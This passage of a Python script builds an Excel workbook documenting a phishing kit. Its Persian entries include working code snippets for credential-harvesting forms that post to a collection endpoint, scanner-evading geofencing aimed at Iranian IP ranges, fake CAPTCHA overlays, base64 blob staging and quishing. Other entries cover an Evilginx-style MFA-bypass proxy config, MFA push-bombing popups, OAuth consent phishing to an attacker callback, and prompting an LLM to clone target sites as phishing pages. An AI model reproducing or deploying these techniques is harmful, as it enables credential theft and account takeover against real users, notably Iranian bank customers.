     "           id='__ph_frame_0__'></iframe>\n\n"
     "۲. sandbox='allow-scripts allow-forms' اجازه می‌دهد فرم submit شود.\n"
     "   loading='lazy' باعث می‌شود اسکنرهای سریع iframe را load نکنند.\n\n"
     "۳. یک JS listener اضافه می‌شود:\n"
     "   window.addEventListener('message', function(e){\n"
     "     if(e.data && e.data.type === 'credentials'){\n"
     "       fetch('/collect', {method:'POST', body: JSON.stringify(e.data)})\n"
     "     }\n"
     "   });\n\n"
     "۴. iframe می‌تواند با window.parent.postMessage() اطلاعات بفرستد.\n"
     "   این pattern روی سایت‌هایی که Same-Origin را enforce نمی‌کنند کار می‌کند.\n\n"
     "خروجی HTML: فایل __T14.html — HTML اصلی با iframe های off-screen."),

    (15, "T15",
     "ضد-ربات – گروه ۴",
     "IP Geofencing & Cloaking\nجغرافیافیلترینگ IP",
     "ارائه محتوای مخرب فقط به IP های ایرانی. IP های خارجی redirect به سایت اصلی "
     "می‌شوند. اسکنرهای خارجی (VirusTotal، URLScan) صفحه فیشینگ را نمی‌بینند.",
     "۱. تهیه لیست CIDR بلوک‌های ایران\n"
     "۲. ساخت JS با لیست CIDR و تابع ip_in_range()\n"
     "۳. fetch('https://api.ipify.org?format=json') برای گرفتن IP واقعی\n"
     "۴. مقایسه IP با CIDR list در JS\n"
     "۵. اگر ایرانی: نمایش محتوا\n"
     "۶. اگر خارجی: window.location.replace(original_url)",
     "HTML با <body>\nURL اصلی برای redirect",
     "modified_html: HTML با geofencing JS",
     "هیچ شکستی — ۱۰۰٪ موفق",
     "فایل: app/techniques/group4_antibot/t15_geofence.py\n\n"
     "۱. لیست CIDR بلوک‌های ایران در کد hard-code شده‌اند:\n"
     "   IRAN_CIDR = ['5.22.196.0/22', '5.22.200.0/21', '2.176.0.0/12', ...]\n"
     "   این لیست از IANA و RIPE NCC گرفته شده.\n\n"
     "۲. تابع JS برای تشخیص IP range:\n"
     "   function ipToInt(ip){ return ip.split('.').reduce((a,b)=>a*256+parseInt(b),0); }\n"
     "   function inRange(ip, cidr){\n"
     "     const [net, bits] = cidr.split('/');\n"
     "     const mask = ~((1 << (32-bits)) - 1);\n"
     "     return (ipToInt(ip) & mask) === (ipToInt(net) & mask);\n"
     "   }\n\n"
     "۳. کل flow در JS:\n"
     "   fetch('https://api.ipify.org?format=json')\n"
     "     .then(r=>r.json())\n"
     "     .then(d=>{\n"
     "       const ip = d.ip;\n"
     "       if(IRAN_CIDR.some(c=>inRange(ip,c))) { showPhishing(); }\n"
     "       else { window.location.replace(ORIGINAL_URL); }\n"
     "     });\n\n"
     "خروجی HTML: فایل __T15.html — HTML با geofencing script که محتوا را شرطی نمایش می‌دهد."),

    (16, "T16",
     "ضد-ربات – گروه ۴",
     "Fake CAPTCHA Overlay (Cloudflare / reCAPTCHA)\nCAPTCHA جعلی",
     "نمایش صفحه تأیید امنیتی جعلی قبل از محتوای اصلی. دو style: Cloudflare Turnstile "
     "(اتوماتیک با Ray ID) و reCAPTCHA (checkbox). متن فارسی کامل برای .ir.",
     "۱. detect_language(html, url) → زبان\n"
     "۲. تولید Ray ID جعلی با secrets.token_hex(8)\n"
     "۳. انتخاب style: cloudflare یا recaptcha\n"
     "۴. بارگذاری FAKE_CF_CSS و FAKE_CF_HTML از templates\n"
     "۵. .format() با متن i18n catalog\n"
     "۶. JS setTimeout N ثانیه → redirect به صفحه اصلی\n"
     "۷. درج overlay به‌عنوان wrapper در HTML",
     "HTML\nURL برای TLD-based language",
     "modified_html: HTML صفحه CAPTCHA جعلی\noriginal HTML داخل overlay",
     "هیچ شکستی — ۱۰۰٪ موفق",
     "فایل: app/techniques/group4_antibot/t16_fake_captcha.py\n"
     "Templates در: app/techniques/group4_antibot/captcha_templates.py\n\n"
     "۱. FAKE_CF_HTML یک template HTML است که شبیه Cloudflare Turnstile است:\n"
     "   - Logo Cloudflare با CSS\n"
     "   - Ray ID جعلی: '{ray_id}' → با secrets.token_hex(8) replace می‌شود\n"
     "   - متن «{checking}» → از i18n catalog بر اساس زبان\n\n"
     "۲. JS خودکار در template جاسازی شده:\n"
     "   setTimeout(function(){\n"
     "     document.getElementById('__cf_overlay__').style.display='none';\n"
     "   }, {delay_ms});\n"
     "   بعد از {delay_ms} میلی‌ثانیه overlay پنهان می‌شود و محتوای زیرین دیده می‌شود.\n\n"
     "۳. برای reCAPTCHA style: checkbox با JS event listener:\n"
     "   checkbox.addEventListener('change', function(){\n"
     "     // simulate verification delay\n"
     "     setTimeout(() => overlay.style.display='none', 1500);\n"
     "   });\n\n"
     "۴. كل محتوای اصلی HTML به‌عنوان پس‌زمینه overlay باقی می‌ماند.\n\n"
     "خروجی HTML: فایل __T16.html — overlay CAPTCHA جعلی + HTML اصلی زیر آن."),

    (17, "T17",
     "تحویل چندمرحله‌ای – گروه ۵",
     "Multi-stage CAPTCHA + Credential Flow\nجریان CAPTCHA چندمرحله‌ای",
     "جریان دومرحله‌ای: مرحله ۱ CAPTCHA جعلی، مرحله ۲ فرم credential. Stage 2 به‌عنوان "
     "base64 درون stage 1 جاسازی می‌شود — اسکنرها هرگز stage 2 را نمی‌بینند.",
     "۱. detect_language(html, url)\n"
     "۲. _build_credential_page(): HTML فرم email+password\n"
     "۳. base64.b64encode(credential_page) → b64_stage2\n"
     "۴. _build_captcha_gate(): HTML مرحله اول با:\n"
     "   • checkbox «من ربات نیستم»\n"
     "   • const __s2 = 'BASE64_STAGE2' (embed)\n"
     "   • JS: atob(__s2) → Blob → createObjectURL → نمایش\n"
     "۵. ذخیره credential_page جداگانه در extra_files",
     "URL هدف",
     "modified_html: HTML جریان دومرحله‌ای\nextra_files: credential_form.html",
     "هیچ شکستی — ۱۰۰٪ موفق",
     "فایل: app/techniques/group5_delivery/t17_captcha_flow.py\n\n"
     "۱. _build_credential_page() یک فرم HTML کامل می‌سازد:\n"
     "   <form method='POST' action='/collect'>\n"
     "     <input type='email' name='email' placeholder='ایمیل یا شماره تلفن'>\n"
     "     <input type='password' name='password' placeholder='گذرواژه'>\n"
     "     <button type='submit'>ورود</button>\n"
     "   </form>\n\n"
     "۲. این credential page کامل base64 می‌شود:\n"
     "   b64 = base64.b64encode(credential_html.encode()).decode()\n\n"
     "۳. Stage 1 HTML حاوی این JS است:\n"
     "   const __s2 = 'BASE64_STAGE2...';\n"
     "   checkbox.addEventListener('change', function(){\n"
     "     var bin = atob(__s2);\n"
     "     var arr = new Uint8Array(bin.length);\n"
     "     for(var i=0;i<bin.length;i++) arr[i]=bin.charCodeAt(i);\n"
     "     var blob = new Blob([arr], {type:'text/html'});\n"
     "     var url = URL.createObjectURL(blob);\n"
     "     window.location.href = url;\n"
     "   });\n\n"
     "۴. Stage 2 به‌عنوان blob: URL باز می‌شود — هیچ network request وجود ندارد.\n"
     "   اسکنرها never stage 2 را می‌بینند چون embedded است.\n\n"
     "خروجی HTML: فایل __T17.html (stage 1) + credential_form.html در extras."),

    (18, "T18",
     "تحویل چندمرحله‌ای – گروه ۵",
     "QR Code (Quishing)\nکد QR",
     "تبدیل URL فیشینگ به QR code و embed در HTML. قربانی با موبایل QR اسکن می‌کند. "
     "URL-based scanners متن URL را در QR نمی‌بینند.",
     "۱. کتابخانه qrcode با error_correction=M\n"
     "۲. qr = qrcode.QRCode(...)\n"
     "۳. qr.add_data(url); qr.make(fit=True)\n"
     "۴. img = qr.make_image(fill_color='black', back_color='white')\n"
     "۵. BytesIO buffer → img.save(buffer, 'PNG')\n"
     "۶. base64.b64encode(png_bytes) → data URI\n"
     "۷. embed در <img> درون HTML",
     "URL فیشینگ\nکتابخانه qrcode + Pillow",
     "modified_html: HTML با QR code embedded\nextra_files: qr_code.png",
     "هیچ شکستی — ۱۰۰٪ موفق",
     "فایل: app/techniques/group5_delivery/t18_qr_code.py\n"
     "کتابخانه: qrcode (PyPI) + Pillow\n\n"
     "۱. تولید QR با کتابخانه qrcode:\n"
     "   qr = qrcode.QRCode(\n"
     "     version=None,  # auto-detect size\n"
     "     error_correction=qrcode.constants.ERROR_CORRECT_M,  # 15% redundancy\n"
     "     box_size=10,\n"
     "     border=4\n"
     "   )\n"
     "   qr.add_data(phishing_url)\n"
     "   qr.make(fit=True)  # خودکار size را تنظیم می‌کند\n\n"
     "۲. تبدیل به PIL Image و سپس PNG bytes:\n"
     "   img = qr.make_image(fill_color='black', back_color='white')\n"
     "   buf = io.BytesIO()\n"
     "   img.save(buf, 'PNG')\n"
     "   png_bytes = buf.getvalue()\n\n"
     "۳. encode و embed در HTML:\n"
     "   data_uri = 'data:image/png;base64,' + base64.b64encode(png_bytes).decode()\n"
     "   <img src='{data_uri}' alt='Scan to continue'>\n\n"
     "۴. error_correction=M: اگر حتی ۱۵٪ QR آسیب ببیند، هنوز readable است.\n"
     "   این برای چاپ یا compression مفید است.\n\n"
     "خروجی HTML: فایل __T18.html — HTML با QR code به‌عنوان data URI."),

    (19, "T19",
     "تحویل چندمرحله‌ای – گروه ۵",
     "Blob QR Landing Page\nصفحه QR با Blob URL",
     "قرار دادن payload فیشینگ در یک blob: URL که با JavaScript ساخته می‌شود. QR code "
     "این blob URL را encode می‌کند. Network scanners blob URL را نمی‌بینند.",
     "۱. ساخت QR PNG از URL فیشینگ (مثل T18)\n"
     "۲. base64 encode QR bytes\n"
     "۳. JS template در HTML:\n"
     "   var b64='BASE64_QR...'\n"
     "   var bin=atob(b64) → Uint8Array → Blob\n"
     "   var burl=URL.createObjectURL(blob)\n"
     "   document.getElementById('__blob_qr__').src=burl\n"
     "۴. کل landing page HTML با QR div\n"
     "۵. revokeObjectURL پس از استفاده",
     "URL فیشینگ\nکتابخانه qrcode",
     "modified_html: HTML landing با QR از blob\nextra_files: qr_blob_landing.html",
     "هیچ شکستی — ۱۰۰٪ موفق",
     "فایل: app/techniques/group5_delivery/t19_blob_qr.py\n\n"
     "۱. ابتدا QR PNG مثل T18 ساخته می‌شود (همان کد).\n\n"
     "۲. فرق اصلی: به‌جای embed مستقیم، از blob: URI استفاده می‌شود:\n"
     "   const QR_B64 = 'PHN2Zy...' // base64 PNG\n"
     "   window.addEventListener('load', function(){\n"
     "     var bin = atob(QR_B64);\n"
     "     var arr = new Uint8Array(bin.length);\n"
     "     for(var i=0;i<bin.length;i++) arr[i] = bin.charCodeAt(i);\n"
     "     var blob = new Blob([arr], {type:'image/png'});\n"
     "     var url = URL.createObjectURL(blob);\n"
     "     document.getElementById('__blob_qr__').src = url;\n"
     "   });\n\n"
     "۳. blob: URL فقط در همان tab و مرورگر valid است و در network log دیده نمی‌شود.\n"
     "   URL.createObjectURL() یک URL مثل blob:http://localhost/a3f9b2c1 می‌سازد.\n\n"
     "۴. وقتی کاربر tab را می‌بندد، blob revoke می‌شود — URL دیگر کار نمی‌کند.\n\n"
     "خروجی HTML: فایل __T19.html — landing page با JS که QR را از blob می‌سازد."),

    (20, "T20",
     "دور زدن MFA – گروه ۶",
     "Attacker-in-the-Middle (AiTM) Proxy Config\nپروکسی AiTM",
     "تولید فایل config برای reverse proxy (Evilginx-style) که بین قربانی و سرور واقعی "
     "می‌نشیند. پس از احراز هویت موفق (حتی با MFA)، session cookie ضبط می‌شود.",
     "۱. ساخت proxy config با proxy_port، target_host\n"
     "۲. credential_entries برای capture username/password\n"
     "۳. session_cookie_name برای capture token\n"
     "۴. HTML landing page با reverse proxy URL\n"
     "۵. JavaScript برای session token forwarding",
     "URL سرویس هدف\nC2 endpoint",
     "modified_html: HTML صفحه AiTM landing\nextra_files: aitm_proxy_config.yaml",
     "هیچ شکستی — ۱۰۰٪ موفق",
     "فایل: app/techniques/group6_mfa/t20_aitm_proxy.py\n\n"
     "۱. کد یک phishlet config YAML تولید می‌کند (مشابه Evilginx2):\n"
     "   proxy_port: 8080\n"
     "   proxy_hosts:\n"
     "     - {phish: 'target.attacker.com', orig: 'original.com'}\n"
     "   credentials:\n"
     "     username: [{key: 'username'}, {key: 'email'}]\n"
     "     password: [{key: 'password', type: 'post'}]\n"
     "   session_cookies: [{name: 'sessionid', domain: 'original.com'}]\n\n"
     "۲. HTML landing page که قربانی ابتدا می‌بیند:\n"
     "   iframe با src به proxy server\n"
     "   JS که session cookie را intercept می‌کند\n\n"
     "۳. مکانیسم عمل:\n"
     "   قربانی → proxy → سرور اصلی (login واقعی)\n"
     "   proxy تمام requests/responses را forward می‌کند\n"
     "   پس از login موفق، session cookie کپی می‌شود\n"
     "   مهاجم با این cookie وارد حساب می‌شود — بدون نیاز به password\n\n"
     "خروجی HTML: فایل __T20.html + aitm_proxy_config.yaml در extras."),

    (21, "T21",
     "دور زدن MFA – گروه ۶",
     "MFA Fatigue / Push Bombing\nخستگی MFA با popup تکراری",
     "تزریق popup MFA که با setInterval مکرراً ظاهر می‌شود تا قربانی خسته شده و push "
     "را تأیید کند. دارای دکمه‌های «تأیید» و «رد» با متن فارسی کامل برای .ir.",
     "۱. detect_language(html, url) → زبان\n"
     "۲. _get_css(): CSS برای modal overlay\n"
     "۳. _get_overlay_html(): HTML div#__mfa_overlay__ با:\n"
     "   • دکمه‌های __mfa_btn_approve__ و __mfa_btn_deny__\n"
     "   • اطلاعات دستگاه و موقعیت\n"
     "   • متن از i18n catalog\n"
     "۴. _get_js(): JS با setInterval برای نمایش مجدد\n"
     "۵. append همه به soup و serialize_html()",
     "HTML با <body>\nURL برای language detection",
     "modified_html: HTML اصلی + MFA modal overlay + JS",
     "هیچ شکستی — ۱۰۰٪ موفق\n(زبان فارسی برای .ir)",
     "فایل: app/techniques/group6_mfa/t21_mfa_fatigue.py\n\n"
     "۱. یک div با id='__mfa_overlay__' به <body> اضافه می‌شود:\n"
     "   <div id='__mfa_overlay__' style='position:fixed;top:0;...'>\n"
     "     <div id='__mfa_box__'>\n"
     "       <div id='__mfa_title__'>تأیید درخواست ورود</div>\n"
     "       <button id='__mfa_btn_approve__'>تأیید</button>\n"
     "       <button id='__mfa_btn_deny__'>رد</button>\n"
     "     </div>\n"
     "   </div>\n\n"
     "۲. JavaScript push-bombing logic:\n"
     "   var __mfaCount = 0;\n"
     "   var __mfaMax = 5;  // حداکثر ۵ بار\n"
     "   function __mfaShow(){ ... overlay.style.display='flex'; __mfaCount++; }\n"
     "   function __mfaDeny(){\n"
     "     __mfaHide(ov);\n"
     "     if(__mfaCount < __mfaMax) setTimeout(__mfaShow, 5000);\n"
     "   }\n"
     "   setTimeout(__mfaShow, 2000);  // شروع بعد از 2 ثانیه\n\n"
     "۳. متن‌ها از app/utils/i18n.py گرفته می‌شوند:\n"
     "   t('form.button.approve', 'fa') → 'تأیید'\n"
     "   t('mfa.push.title', 'fa') → 'تأیید درخواست ورود'\n"
     "   تشخیص .ir با detect_language(html, url) که url-based TLD override دارد.\n\n"
     "خروجی HTML: فایل __T21.html — HTML اصلی با MFA overlay که صفحه را cover می‌کند."),

    (22, "T22",
     "دور زدن MFA – گروه ۶",
     "OAuth Consent Phishing\nفیشینگ OAuth Consent",
     "ساخت صفحه تأیید دسترسی OAuth جعلی (Microsoft یا Google) با scope list فارسی. "
     "قربانی permissions می‌دهد بدون اینکه credentials وارد کند — MFA کاملاً bypass می‌شود.",
     "۱. detect_language(html, url)\n"
     "۲. secrets.token_urlsafe(32) → PKCE code_challenge\n"
     "۳. _scope_items(): لیست HTML از scopes با ترجمه i18n\n"
     "۴. _microsoft_consent() یا _google_consent():\n"
     "   • HTML کامل شبیه Microsoft Identity Platform\n"
     "   • form action=redirect_uri با hidden code، state\n"
     "   • دکمه‌های پذیرش/انصراف با متن i18n\n"
     "۵. extra_files: oauth_consent_page.html",
     "provider: microsoft یا google\nredirect_uri مهاجم",
     "modified_html: HTML صفحه OAuth consent\nextra_files: oauth_consent_page.html",
     "هیچ شکستی — ۱۰۰٪ موفق",
     "فایل: app/techniques/group6_mfa/t22_oauth.py\n\n"
     "۱. PKCE challenge برای واقعی‌تر دیده شدن:\n"
     "   code_challenge = secrets.token_urlsafe(32)  # random 32-byte URL-safe string\n"
     "   این در OAuth 2.0 PKCE flow استفاده می‌شود — جالب است که جعل هم این دارد.\n\n"
     "۲. Scope list با ترجمه فارسی ساخته می‌شود:\n"
     "   _SCOPE_LABEL_KEYS = {'Mail.ReadWrite': 'scope.mail.readwrite', ...}\n"
     "   label = t('scope.mail.readwrite', 'fa') → 'خواندن و ارسال ایمیل از طرف شما'\n"
     "   <li>✓ خواندن و ارسال ایمیل از طرف شما <span>(Mail.ReadWrite)</span></li>\n\n"
     "۳. فرم HTML با action به redirect_uri مهاجم:\n"
     "   <form action='https://attacker.com/callback' method='POST'>\n"
     "     <input type='hidden' name='code' value='eyJhbGci...'>\n"
     "     <input type='hidden' name='state' value='oauth_state_token'>\n"
     "     <input type='hidden' name='code_challenge' value='{code_challenge}'>\n"
     "     <button class='btn-accept'>پذیرش</button>\n"
     "   </form>\n\n"
     "۴. وقتی قربانی «پذیرش» کلیک کند، مرورگر به redirect_uri مهاجم POST می‌کند.\n\n"
     "خروجی HTML: فایل __T22.html — صفحه OAuth consent کامل."),

    (23, "T23",
     "پیشرفته / هوش مصنوعی – گروه ۷",
     "AI Full-Page Cloning (LLM)\nکلون‌سازی کامل با هوش مصنوعی",
     "استفاده از LLM (Claude، GPT، Gemini) برای تولید HTML که بصری مشابه سایت هدف است. "
     "از URL + screenshot برای ساخت prompt استفاده می‌شود.",
     "۱. _resolve_credentials(): خواندن AI_API_KEY از env\n"
     "۲. ساخت prompt با URL و توضیح سایت\n"
     "۳. اگر screenshot_bytes: attach به prompt به‌عنوان image\n"
     "۴. ارسال به OpenAI-compatible API\n"
     "۵. استخراج HTML از response (بین ```html و ```)\n"
     "۶. تزریق فرم credential harvesting\n"
     "۷. بازگشت HTML کلون‌شده",
     "AI_API_KEY (ANTHROPIC_API_KEY یا OPENAI_API_KEY)\n(اختیاری) screenshot",
     "modified_html: HTML کلون AI\nextra_files: ai_cloned_page.html",
     "226 شکست — وابستگی خارجی (API Key)\n(رفتار مورد انتظار)",
     "فایل: app/techniques/group7_advanced/t23_ai_cloning.py\n"
     "کتابخانه: openai (PyPI) — سازگار با Claude، OpenAI، Gemini\n\n"
     "۱. Prompt engineering برای کلون‌سازی:\n"
     "   prompt = f'Generate complete HTML for phishing page that visually mimics {url}.\n"
     "   Include a credential form. Return ONLY the HTML code.'\n"
     "   اگر screenshot باشد: image به prompt attach می‌شود\n\n"
     "۲. ارسال به API:\n"
     "   client = OpenAI(api_key=api_key, base_url=api_base)\n"
     "   response = client.chat.completions.create(\n"
     "     model=model_name,\n"
     "     messages=[{'role':'user', 'content': prompt}]\n"
     "   )\n"
     "   html = response.choices[0].message.content\n\n"
     "۳. استخراج HTML بین backtick markers:\n"
     "   re.search(r'```html\\n(.*?)```', html, re.DOTALL)\n\n"
     "۴. بدون API Key: graceful fallback — HTML خالی با پیام\n"
     "   'AI cloning requires AI_API_KEY environment variable'\n\n"
     "خروجی HTML: فایل __T23.html — صفحه کلون‌شده توسط AI."),

    (24, "T24",
     "پیشرفته / هوش مصنوعی – گروه ۷",
     "LSB Steganography in Images\nاستگانوگرافی LSB در تصاویر",
     "پنهان‌کردن text payload درون pixel های تصویر PNG با LSB steganography. تصویر "
     "بصری تغییر نمی‌کند اما payload در pixel bits رمزگذاری شده است.",
     "۱. یافتن <img> در HTML با src PNG\n"
     "۲. دانلود PNG bytes\n"
     "۳. PIL Image.open() → convert('RGB')\n"
     "۴. _embed_lsb(): برای هر pixel، payload bits را در LSB کانال قرمز می‌نویسد\n"
     "   header 4 بایت: طول payload (big-endian)\n"
     "   سپس payload bytes bit by bit\n"
     "۵. stego_img → PNG bytes → data URI\n"
     "۶. img_tag['src'] = data_uri در soup",
     "HTML با <img> PNG\nکتابخانه Pillow",
     "modified_html: HTML با stego PNG embedded\nextra_files: stego_carrier.png",
     "90 شکست داده‌محور: سایت‌های بدون PNG یا PNG خیلی کوچک",
     "فایل: app/techniques/group7_advanced/t24_stego.py\n"
     "کتابخانه: Pillow (PIL) — Image، pixel manipulation\n\n"
     "۱. LSB = Least Significant Bit — کم‌ارزش‌ترین بیت هر کانال رنگ.\n"
     "   تغییر LSB یک pixel: RGB(200,150,100) → RGB(201,150,100) — تفاوت بصری ندارد.\n\n"
     "۲. ساختار payload در تصویر:\n"
     "   4 بایت اول: طول payload (struct.pack('>I', len(payload)))\n"
     "   سپس هر بیت payload در LSB یک pixel کانال قرمز نوشته می‌شود\n\n"
     "۳. کد embed:\n"
     "   pixels = list(img.getdata())\n"
     "   bit_idx = 0\n"
     "   for i, (r, g, b) in enumerate(pixels):\n"
     "     if bit_idx >= total_bits: break\n"
     "     new_r = (r & ~mask) | (payload_bit << 0)  # clear LSB, set new\n"
     "     pixels[i] = (new_r, g, b)\n"
     "   img.putdata(pixels)\n\n"
     "۴. برای decode: همان reverse عمل می‌کند — خواندن LSB هر pixel.\n"
     "   اما کد JS decoder در HTML inject نشده — payload فقط در image است.\n\n"
     "خروجی HTML: فایل __T24.html — HTML اصلی با img src که stego PNG embed شده."),

    (25, "T25",
     "پیشرفته / هوش مصنوعی – گروه ۷",
     "Baseline Credential Harvesting Form\nفرم ورود پایه (مرجع)",
     "پیاده‌سازی مرجع: فرم ورود با متن فارسی کامل برای .ir که اعتبارسنجی را به C2 "
     "ارسال می‌کند. اگر فرم در HTML بود action آن تغییر می‌کند، وگرنه فرم جدید inject می‌شود.",
     "۱. detect_language(html, url) → زبان\n"
     "۲. parse_html(html) با BS4\n"
     "۳. یافتن <form> موجود در HTML\n"
     "۴. اگر بود: form['action'] = form_action_url\n"
     "   تغییر name fields به credential_field_names\n"
     "۵. اگر نبود: inject_credential_form():\n"
     "   HTML کامل email+password با متن i18n\n"
     "۶. serialize_html(soup)",
     "URL هدف",
     "modified_html: HTML با فرم credential harvesting",
     "هیچ شکستی — ۱۰۰٪ موفق",
     "فایل: app/techniques/group7_advanced/t25_baseline.py\n\n"
     "۱. اگر HTML دارای <form> باشد، فقط action تغییر می‌کند:\n"
     "   form = soup.find('form')\n"
     "   form['action'] = '/collect'  # redirect به C2\n"
     "   form['method'] = 'POST'\n"
     "   این حداقل تغییر ممکن است — شکل ظاهری صفحه حفظ می‌شود.\n\n"
     "۲. اگر HTML فرم نداشت، inject_credential_form() اجرا می‌شود:\n"
     "   lang = detect_language(html, url)\n"
     "   email_label = t('form.label.email_or_phone', lang)  → 'ایمیل یا شماره تلفن'\n"
     "   password_label = t('form.label.password', lang)    → 'گذرواژه'\n"
     "   button_text = t('form.button.signin', lang)         → 'ورود'\n"
     "   HTML فرم با این متن‌ها ساخته و به <body> append می‌شود.\n\n"
     "۳. Hidden fields اضافه می‌شوند:\n"
     "   <input type='hidden' name='_origin' value='{url}'>\n"
     "   <input type='hidden' name='_ts' value='{timestamp}'>\n"
     "   این metadata برای مهاجم مفید است.\n\n"
     "۴. i18n catalog تضمین می‌کند برای بانک‌های ایرانی متن کاملاً فارسی باشد.\n"
     "   detect_language(html, url) با url='.ir' همیشه 'fa' برمی‌گرداند.\n\n"
     "خروجی HTML: فایل __T25.html — HTML با فرم credential harvesting کامل."),
]

THIN = Side(style="thin", color="CCCCCC")
BORDER = Border(left=THIN, right=THIN, top=THIN, bottom=THIN)

HEADER_FILL = PatternFill("solid", fgColor="1F3864")
CODE_FILL   = PatternFill("solid", fgColor="F2F2F2")

GROUP_COLORS = {
    "دستکاری URL – گروه ۱":              "D9EAD3",
    "تقلید بصری – گروه ۲":              "FFF2CC",
    "HTML / DOM / JS – گروه ۳":         "FCE4D6",
    "ضد-ربات – گروه ۴":                 "EDEDED",
    "تحویل چندمرحله‌ای – گروه ۵":        "D9E1F2",
    "دور زدن MFA – گروه ۶":             "F4CCCC",
    "پیشرفته / هوش مصنوعی – گروه ۷":    "EAD1DC",
}

PASS_FILL = PatternFill("solid", fgColor="C6EFCE")
PART_FILL = PatternFill("solid", fgColor="FFEB9C")
FAIL_FILL = PatternFill("solid", fgColor="FFC7CE")
DEP_FILL  = PatternFill("solid", fgColor="E2EFDA")

HEADER_FONT  = Font(name="Calibri", bold=True, color="FFFFFF", size=10)
BODY_FONT    = Font(name="Calibri", size=9)
TID_FONT     = Font(name="Calibri", bold=True, size=11)
CODE_FONT    = Font(name="Consolas", size=8, color="1F3864")
PASS_FONT    = Font(name="Calibri", bold=True, color="375623", size=9)
PART_FONT    = Font(name="Calibri", bold=True, color="9C6500", size=9)
FAIL_FONT    = Font(name="Calibri", bold=True, color="9C0006", size=9)
DEP_FONT     = Font(name="Calibri", bold=True, color="375623", size=9)

WRAP_LTR = Alignment(wrap_text=True, vertical="top", horizontal="left",  readingOrder=1)
WRAP_RTL = Alignment(wrap_text=True, vertical="top", horizontal="right", readingOrder=2)
CENTER   = Alignment(horizontal="center", vertical="center", wrap_text=True)


def _eval_label(pass_rate, failure_type):
    if failure_type == "dependency":
        return DEP_FILL, DEP_FONT, "وابستگی خارجی\n(بدون API Key)"
    if pass_rate == 100:
        return PASS_FILL, PASS_FONT, f"{pass_rate}٪ ✓"
    if pass_rate >= 80:
        return PASS_FILL, PASS_FONT, f"{pass_rate}٪ PASS"
    if pass_rate >= 50:
        return PART_FILL, PART_FONT, f"{pass_rate}٪ PARTIAL"
    return FAIL_FILL, FAIL_FONT, f"{pass_rate}٪ FAIL"


def build_overview(wb):
    ws = wb.create_sheet("خلاصه ارزیابی", 0)
    ws.sheet_view.rightToLeft = True

    col_w = [7, 32, 24, 10, 10, 10, 12, 22]
    hdrs  = ["کد", "نام تکنیک", "گروه", "موفق", "ناموفق", "امتیاز", "نرخ", "وضعیت"]
    for i, (w, h) in enumerate(zip(col_w, hdrs), 1):
        ws.column_dimensions[get_column_letter(i)].width = w
        c = ws.cell(1, i, h)
        c.fill = HEADER_FILL; c.font = HEADER_FONT; c.alignment = CENTER; c.border = BORDER
    ws.row_dimensions[1].height = 24

    totals = {"passed": 0, "failed": 0}
    for ri, (num, tid, grp, name, *_rest) in enumerate(TECHNIQUES_DOC, 2):
        ws.row_dimensions[ri].height = 34
        ev = EVAL_RESULTS[tid]
        ev_fill, ev_font, ev_lbl = _eval_label(ev["pass_rate"], ev["failure_type"])
        gfill = PatternFill("solid", fgColor=GROUP_COLORS.get(grp, "FFFFFF"))
        totals["passed"] += ev["passed"]; totals["failed"] += ev["failed"]

        row_vals = [tid, name.split("\n")[0], grp.split("–")[0].strip(),
                    ev["passed"], ev["failed"], f"{ev['avg_score']:.3f}",
                    f"{ev['pass_rate']}%", ev_lbl]
        row_fills = [gfill, gfill, gfill,
                     PASS_FILL if ev["passed"] > 0 else FAIL_FILL,
                     FAIL_FILL if ev["failed"] > 0 else PASS_FILL,
                     gfill, gfill, ev_fill]
        row_fonts = [TID_FONT] + [BODY_FONT]*6 + [ev_font]
        for ci, (v, f, fn) in enumerate(zip(row_vals, row_fills, row_fonts), 1):
            c = ws.cell(ri, ci, v); c.fill = f; c.font = fn
            c.border = BORDER; c.alignment = CENTER

    tot = totals["passed"] + totals["failed"]
    tr = len(TECHNIQUES_DOC) + 2
    ws.row_dimensions[tr].height = 24
    pct = 100 * totals["passed"] // tot if tot else 0
    for ci, v in enumerate(["جمع", "", "", totals["passed"], totals["failed"],
                             "", f"{pct}%", f"✓ {pct}٪ overall"], 1):
        c = ws.cell(tr, ci, v)
        c.font = Font(name="Calibri", bold=True, size=10)
        c.fill = HEADER_FILL if ci == 1 else (PASS_FILL if ci == 4 else
                  (FAIL_FILL if ci == 5 else PatternFill()))
        c.border = BORDER; c.alignment = CENTER

    ws.freeze_panes = "A2"
    ws.auto_filter.ref = f"A1:H{len(TECHNIQUES_DOC)+1}"


def build_detail(wb):
    ws = wb.create_sheet("مستندات تکنیک‌ها")
    ws.sheet_view.rightToLeft = True

    col_w = [7,  20,  20,  36, 36, 26, 28, 28, 52]
    hdrs  = [
        "کد",
        "نام تکنیک",
        "گروه",
        "چه می‌کند",
        "چطور داده تولید می‌شود",
        "پیش‌نیازها",
        "خروجی‌ها",
        "تحلیل شکست",
        "توضیح کد و تولید HTML",
    ]
    for i, (w, h) in enumerate(zip(col_w, hdrs), 1):
        ws.column_dimensions[get_column_letter(i)].width = w
        c = ws.cell(1, i, h)
        c.fill = HEADER_FILL; c.font = HEADER_FONT
        c.alignment = CENTER; c.border = BORDER
    ws.row_dimensions[1].height = 28

    for ri, (num, tid, grp, name, what, how, reqs, outs, fails, code_walk) in \
            enumerate(TECHNIQUES_DOC, 2):
        ws.row_dimensions[ri].height = 220

        ev = EVAL_RESULTS[tid]
        ev_fill, _, _ = _eval_label(ev["pass_rate"], ev["failure_type"])
        gfill  = PatternFill("solid", fgColor=GROUP_COLORS.get(grp, "FFFFFF"))
        white  = PatternFill("solid", fgColor="FFFFFF")
        faint  = PatternFill("solid", fgColor="FAFAFA")

        row_data = [
            (tid,       TID_FONT,  CENTER,    gfill),
            (name,      BODY_FONT, WRAP_RTL,  gfill),
            (grp,       BODY_FONT, WRAP_RTL,  gfill),
            (what,      BODY_FONT, WRAP_RTL,  white),
            (how,       BODY_FONT, WRAP_RTL,  faint),
            (reqs,      BODY_FONT, WRAP_RTL,  white),
            (outs,      BODY_FONT, WRAP_RTL,  faint),
            (fails,     BODY_FONT, WRAP_RTL,  ev_fill),
            (code_walk, CODE_FONT, WRAP_LTR,  CODE_FILL),
        ]
        for ci, (v, fn, al, fl) in enumerate(row_data, 1):
            c = ws.cell(ri, ci, v)
            c.font = fn; c.alignment = al; c.fill = fl; c.border = BORDER

    ws.freeze_panes = "A2"
    ws.auto_filter.ref = f"A1:I{len(TECHNIQUES_DOC)+1}"


def main():
    wb = openpyxl.Workbook()
    wb.remove(wb.active)
    build_overview(wb)
    build_detail(wb)

    out = pathlib.Path("data/phishing_technique_documentation.xlsx")
    out.parent.mkdir(parents=True, exist_ok=True)
    wb.save(str(out))
